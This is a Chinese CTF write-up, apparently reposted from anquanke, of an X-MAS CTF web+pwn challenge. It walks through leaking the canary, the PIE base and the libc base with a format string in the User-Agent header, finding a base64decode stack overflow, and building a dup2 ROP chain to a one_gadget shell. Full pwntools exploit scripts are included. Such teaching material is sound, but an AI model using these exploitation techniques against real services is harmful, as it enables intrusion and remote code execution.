> 原文链接: https://www.anquanke.com//post/id/168705 


# 圣诞前夕X-MAS CTF一道有趣的web+pwn


                                阅读量   
                                **227844**
                            
                        |
                        
                                                            评论
                                <b>
                                    <a target="_blank">2</a>
                                </b>
                                                                                                                                    ![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)
                                                                                            



[![](https://p4.ssl.qhimg.com/dm/1024_640_/t01fe36afac72e16a90.jpg)](https://p4.ssl.qhimg.com/dm/1024_640_/t01fe36afac72e16a90.jpg)



## 0x001 前言

最近空下来，做了一下X-MAS CTF的pwn题，题目质量很好，期间遇到一道web+pwn花了不少时间，主要从子进程调试、socket通信方面详细讨论如何解决这类基于socket服务的pwn题。

题目下载：

链接:[https://pan.baidu.com/s/1G4L-B1rSydLRCJ-9Zcy9Ug](https://pan.baidu.com/s/1G4L-B1rSydLRCJ-9Zcy9Ug) 密码:wsxd



## 0x002 分析

题目给了一个基于socket的server(保护全开)以及libc.so

[![](https://p5.ssl.qhimg.com/t0147fe29bcf48ce362.png)](https://p5.ssl.qhimg.com/t0147fe29bcf48ce362.png)

把server跑起来，通过浏览器访问`http://localhost:1337`，出现了这样一个页面，有点像web的画风，字面意思是：预留了了一个通过GET请求的接口

[![](https://p3.ssl.qhimg.com/t01919f457b8944d8b9.png)](https://p3.ssl.qhimg.com/t01919f457b8944d8b9.png)

多翻尝试，发现可以这样调用

```
/?toy=base64_string
```

比如说，请求`hello world`页面，传入`hello world`的base64编码`aGVsbG8gd29ybGQ=`

[![](https://p3.ssl.qhimg.com/t0114d423b4fc3e07f3.png)](https://p3.ssl.qhimg.com/t0114d423b4fc3e07f3.png)

先测试一下有没有溢出，传入一个超长串的base64编码

```
/?toy=QUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQQ==
```

网页直接崩掉，server的启动终端提示`stack smashing`，说明发生溢出了，但有canary，下面找找可以info leak的洞

[![](https://p1.ssl.qhimg.com/t01c664ace041e2eb84.png)](https://p1.ssl.qhimg.com/t01c664ace041e2eb84.png)



## 0x003 Bypass Canary

找到`route`函数，这里有一处fsb可以用于泄漏stack cookie

[![](https://p1.ssl.qhimg.com/t010ec4f032ba29248a.png)](https://p1.ssl.qhimg.com/t010ec4f032ba29248a.png)

下面说说调试方法：

一般的pwn题，直接通过socat起来，要调试的只有一个进程；对于socket服务，当接收到请求，会fork出来一个子进程，该子进程的内存空间布局与父进程一致，同理，这样多次会话泄漏出来的Canary也完全一致。直接在子进程代码中下断点，程序是不会断下的，需要先设置跟随子进程`set follow-fork-mode child`。

先在`route`处下断，设置跟随子进程，运行这段leak脚本

```
#! /usr/bin/env python
# -*- coding: utf-8 -*-

from pwn import *

def _request(gift,fmt,ctl):
    req = "GET /?toy=`{``}` HTTP/1.1rn".format(gift)
    req += "User-Agent: `{``}`rn".format(fmt)

    s=remote("localhost",1337,level="error")
    s.s(req)
    try:
        if not ctl:
            return re.findall("&lt;br&gt;(.*?)&lt;/small&gt;", s.recvall())[0][10:]
        else:
            return s.irt()
    except EOFError:
        return None
    finally:
        s.close()

def pwn():
    leak = _request(b64e('wooy0ung'),'%p '*200,False).split(' ')

if __name__ == '__main__':
    pwn()
```

现在段在了`printf`调用的地方，查看栈上该处便是`cookie`

[![](https://p1.ssl.qhimg.com/t01a528e49929cea10f.png)](https://p1.ssl.qhimg.com/t01a528e49929cea10f.png)

查看内存布局，顺便把pie_base、libc_base泄漏出来

[![](https://p5.ssl.qhimg.com/t01da4da250d8c02597.png)](https://p5.ssl.qhimg.com/t01da4da250d8c02597.png)

对比基址，确定通过以下这几处可以泄漏`0x0000555555556006-0x0000555555554000 = 0x2006`、`0x00007ffff7a2d830-0x00007ffff7a0d000 = 0x20830`

[![](https://p1.ssl.qhimg.com/t01b27d9a4f5310e61a.png)](https://p1.ssl.qhimg.com/t01b27d9a4f5310e61a.png)

换算一下，得到基址

[![](https://p3.ssl.qhimg.com/t0129f724d190ab789d.png)](https://p3.ssl.qhimg.com/t0129f724d190ab789d.png)



## 0x004 Stack overflow

关于溢出点，找了好久，server设置跟随子进程，跑一下这段poc

```
#! /usr/bin/env python
# -*- coding: utf-8 -*-

from pwn import *

def pwn():
    pl = "QWEwQWExQWEyQWEzQWE0QWE1QWE2QWE3QWE4QWE5QWIwQWIxQWIyQWIzQWI0QWI1QWI2QWI3QWI4"
    pl += "QWI5QWMwQWMxQWMyQWMzQWM0QWM1QWM2QWM3QWM4QWM5QWQwQWQxQWQyQWQzQWQ0QWQ1QWQ2QWQ3"
    pl += "QWQ4QWQ5QWUwQWUxQWUyQWUzQWU0QWU1QWU2QWU3QWU4QWU5QWYwQWYxQWYyQWYzQWY0QWY1QWY2"
    pl += "QWY3QWY4QWY5QWcwQWcxQWcyQWczQWc0QWc1QWc=    "
    req = "GET /?toy=`{``}` HTTP/1.1rn".format(pl)
    s=remote("localhost",1337,level="error")
    s.s(req)

if __name__ == '__main__':
    pwn()
```

子进程崩掉

[![](https://p2.ssl.qhimg.com/t012dc537cfc48a6d48.png)](https://p2.ssl.qhimg.com/t012dc537cfc48a6d48.png)

查看栈回溯，发现在`parse_query_string`开始崩的

[![](https://p4.ssl.qhimg.com/t012df559c8172e456a.png)](https://p4.ssl.qhimg.com/t012df559c8172e456a.png)

重新跟随子进程，停在`base64decode`函数调用的地方

[![](https://p3.ssl.qhimg.com/t01f5e062ca49653022.png)](https://p3.ssl.qhimg.com/t01f5e062ca49653022.png)

先查看一下栈内容，现在是正常的

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p3.ssl.qhimg.com/t01fdee6f51900aef64.png)

`base64decode`调用返回后，栈被覆盖了，通过对比正常的栈内容，得到stack_cookie的偏移`0x928-0x8e0 = 0x48`

[![](https://p0.ssl.qhimg.com/t01d86e922dcb965216.png)](https://p0.ssl.qhimg.com/t01d86e922dcb965216.png)

查看函数`base64decode`的代码，最后确认溢出点在这里，a2是在调用`base64decode`传入的一个局部数组

[![](https://p0.ssl.qhimg.com/t01241a8c005b56bc99.png)](https://p0.ssl.qhimg.com/t01241a8c005b56bc99.png)

查看栈布局，a2的缓冲区大小只有0x48，当越界了就会发生溢出

[![](https://p5.ssl.qhimg.com/t0192e6eb037d4f279f.png)](https://p5.ssl.qhimg.com/t0192e6eb037d4f279f.png)



## 0x005 ROP

现在已经分析完了，下面就是常规栈溢出的做法了，只是要注意现在是在socket服务下的利用，还需要将标准输入、输出重定向到sockfd，可以这样构造rop chain

```
#1.Smash stack bypass
pl = ''
pl += 'a'*0x48
pl += p64(stack_cookie)
#2.Call dup2(4,1) [out]
pl += p64(ret)*4
pl += p64(rdi)
pl += p64(4)
pl += p64(rdx_rsi)
pl += 'a'*8
pl += p64(1)
pl += p64(libc.sym['dup2'])
#3.Call dup2(4,0) [in]
pl += p64(ret)*4
pl += p64(rdi)
pl += p64(4)
pl += p64(rdx_rsi)
pl += 'a'*8
pl += p64(0)
pl += p64(libc.sym['dup2'])
#4.Call system('/bin/sh')
pl += p64(ret)
pl += p64(libc.address+0x45216)
pl.rjust(200,'x00')
```

完整的EXP

```
#! /usr/bin/env python
# -*- coding: utf-8 -*-

from pwn import *
import os, sys
import requests
import re

DEBUG = 4
context.arch = 'amd64'
context.log_level = 'debug'
elf = ELF('./server',checksec=False)

# synonyms for faster typing
tube.s = tube.send
tube.sl = tube.sendline
tube.sa = tube.sendafter
tube.sla = tube.sendlineafter
tube.r = tube.recv
tube.ru = tube.recvuntil
tube.rl = tube.recvline
tube.ra = tube.recvall
tube.rr = tube.recvregex
tube.irt = tube.interactive

if DEBUG == 1:
    libc = ELF('/root/workspace/expmake/libc_x64',checksec=False)
    s = process('./toy')
elif DEBUG == 2:
    libc = ELF('/root/workspace/expmake/libc_x64',checksec=False)
    s = process('./toy', env=`{`'LD_PRELOAD':'/root/workspace/expmake/libc_x64'`}`)
elif DEBUG == 3:
    libc = ELF('/root/workspace/expmake/libc_x64',checksec=False)
    ip = 'localhost' 
    port = 1337
    s = remote(ip,port)
elif DEBUG == 4:
    libc = ELF('/root/workspace/expmake/libc_x64',checksec=False)

def _request(gift,fmt,ctl):
    req = "GET /?toy=`{``}` HTTP/1.1rn".format(gift)
    req += "User-Agent: `{``}`rn".format(fmt)

    s=remote("localhost",1337,level="error")
    s.s(req)
    try:
        if not ctl:
            return re.findall("&lt;br&gt;(.*?)&lt;/small&gt;", s.recvall())[0][10:]
        else:
            return s.irt()
    except EOFError:
        return None
    finally:
        s.close()

def pwn():
    leak = _request(b64e('wooy0ung'),'%p '*200,False).split(' ')
    #print leak

    pie_base = int(leak[0], 16) - 0x2006    # 0x0000555555556006-0x0000555555554000 = 0x2006
    stack_cookie = int(leak[6], 16)
    libc.address = int(leak[36],16) - 0x20830    # 0x7ffff7a2d830-0x00007ffff7a0d000 = 0x20830

    info("0x%x pie_base",pie_base)
    info("0x%x stack_cookie",stack_cookie)
    info("0x%x libc.address",libc.address)

    '''
    pl = "QWEwQWExQWEyQWEzQWE0QWE1QWE2QWE3QWE4QWE5QWIwQWIxQWIyQWIzQWI0QWI1QWI2QWI3QWI4"
    pl += "QWI5QWMwQWMxQWMyQWMzQWM0QWM1QWM2QWM3QWM4QWM5QWQwQWQxQWQyQWQzQWQ0QWQ1QWQ2QWQ3"
    pl += "QWQ4QWQ5QWUwQWUxQWUyQWUzQWU0QWU1QWU2QWU3QWU4QWU5QWYwQWYxQWYyQWYzQWY0QWY1QWY2"
    pl += "QWY3QWY4QWY5QWcwQWcxQWcyQWczQWc0QWc1QWc=    "
    req = "GET /?toy=`{``}` HTTP/1.1rn".format(pl)
    s=remote("localhost",1337,level="error")
    s.s(req)
    '''
    ret = pie_base + 0x0000000000000c4e
    rdi = pie_base + 0x0000000000001d9b
    rsi_r15 = pie_base + 0x0000000000001d99
    rdx_rsi = libc.address + 0x00000000001150c9

    #1.Smash stack bypass
    pl = ''
    pl += 'a'*0x48
    pl += p64(stack_cookie)
    #2.Call dup2(4,1) [out]
    pl += p64(ret)*4
    pl += p64(rdi)
    pl += p64(4)
    pl += p64(rdx_rsi)
    pl += 'a'*8
    pl += p64(1)
    pl += p64(libc.sym['dup2'])
    #3.Call dup2(4,0) [in]
    pl += p64(ret)*4
    pl += p64(rdi)
    pl += p64(4)
    pl += p64(rdx_rsi)
    pl += 'a'*8
    pl += p64(0)
    pl += p64(libc.sym['dup2'])
    #4.Call system('/bin/sh')
    pl += p64(ret)
    pl += p64(libc.address+0x45216) # one_gadget
    pl.rjust(200,'x00')

    _request(b64e(pl),'',True)

if __name__ == '__main__':
    pwn()
```

WIN~

[![](https://p5.ssl.qhimg.com/t01eeb9fd14fd85b142.png)](https://p5.ssl.qhimg.com/t01eeb9fd14fd85b142.png)
